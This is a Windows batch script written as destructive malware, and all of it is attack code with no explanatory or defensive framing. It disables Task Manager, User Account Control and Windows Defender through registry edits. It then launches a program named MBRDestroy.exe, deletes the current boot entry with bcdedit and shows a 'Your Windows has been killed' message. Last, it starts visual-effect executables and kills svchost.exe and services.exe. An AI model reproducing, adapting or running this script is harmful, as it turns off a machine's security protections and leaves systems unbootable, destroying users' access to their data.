@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
start MBRDestroy.exe
bcdedit /delete {current}
echo msgbox "Your Windows has been killed by Trojan.Win32.e.exe! It's Your Last Chance to use Windows" > note.vbs
start note.vbs
start /min sound.bat
timeout 5 /nobreak
start /min msgboxes.bat
start eeee.exe
timeout 5 /nobreak
start inv.exe
start glitch.exe
timeout 5 /nobreak
start lines.exe
timeout 10 /nobreak
start melter.exe
taskkill /f /im svchost.exe
taskkill /f /im services.exe